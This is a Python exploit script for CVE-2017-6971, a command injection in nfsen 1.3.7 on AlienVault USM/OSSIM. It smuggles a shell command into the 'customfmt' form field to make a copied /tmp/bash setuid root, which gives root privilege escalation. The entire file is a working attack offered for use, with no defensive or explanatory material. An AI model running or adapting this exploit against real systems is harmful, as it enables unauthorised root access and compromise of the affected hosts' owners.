from __future__ import print_function
import requests
import socket
import base64
from time import sleep
# Exploit for CVE-2017-6971 command injection in nfsen 1.3.7
# privilege escalation vulnerability in nfsen AlienVault USM/OSSIM
# to gain root access, copy /bin/bash to /tmp and run the exploit then: /tmp/bash -p
LHOST=""
LPORT=""
url = "http://127.0.0.1/nfsen/nfsen.php?tab=2"

bash_command = "chown root:root /tmp/bash ; chmod u+s /tmp/bash"
payload = "';" + bash_command + "; '#"
data = {
    'srcselector%5B%5D': 'peer1',
    'filter': '',
    'filter_name': 'none',
    'modeselect': '0',
    'listN': '0',
    'topN': '0',
    'statype': '1',
    'output': 'custom ...',
    'customfmt': payload,
    'process': 'process'
}
s = requests.Session()
# these required for initializing session and navigating to details page
s.get(url)
s.get(url)
# send payload
try:
    s.post(url, data=data, timeout=0.1)
except:
    pass
